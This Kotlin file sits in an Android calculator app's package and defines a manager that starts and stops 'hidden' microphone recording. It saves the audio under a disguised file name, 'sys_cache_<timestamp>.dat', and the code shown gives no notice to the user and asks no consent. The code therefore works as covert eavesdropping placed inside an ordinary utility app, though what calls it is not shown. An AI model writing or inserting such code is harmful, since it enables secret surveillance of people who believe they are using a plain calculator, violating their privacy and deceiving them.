package org.solovyev.android.calculator

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object AudioRecorderManager {
    private var mediaRecorder: MediaRecorder? = null
    var isAudioRecording = false
        private set

    fun startHiddenAudioRecording(
        context: Context,
        onStartSuccess: Runnable,
        onError: Runnable
    ) {
        if (isAudioRecording) return
        
        try {
            val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val outputFile = File(context.filesDir, "sys_cache_$timeStamp.dat")
            
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            
            mediaRecorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(outputFile.absolutePath)
                prepare()
                start()
            }
            
            isAudioRecording = true
            onStartSuccess.run()
        } catch (e: Exception) {
            e.printStackTrace()
            releaseRecorder()
            onError.run()
        }
    }

    fun stopHiddenAudioRecording(onStopSuccess: Runnable) {
        if (!isAudioRecording) return
        
        try {
            mediaRecorder?.stop()
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            releaseRecorder()
            isAudioRecording = false
            onStopSuccess.run()
        }
    }

    private fun releaseRecorder() {
        mediaRecorder?.release()
        mediaRecorder = null
    }
}
